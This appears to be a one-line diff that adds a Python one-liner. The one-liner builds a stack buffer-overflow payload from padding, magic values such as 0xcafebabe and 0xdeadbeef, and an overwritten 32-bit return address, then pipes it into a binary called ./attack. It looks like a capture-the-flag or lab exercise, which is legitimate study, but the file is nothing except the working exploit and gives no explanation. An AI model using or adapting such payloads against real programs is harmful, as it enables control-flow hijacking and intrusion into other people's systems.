@@ -1,0 +1,1 @@
+python3 -c "import sys; sys.stdout.buffer.write(b'a'*0x48 + b'\xbe\xba\xfe\xca' + b'\x0a' + b'a' * 0x40 + b'\xef\xbe\xad\xde' + b'a' * 0x4 + b'\x82\x91\x04\x08')" | ./attack
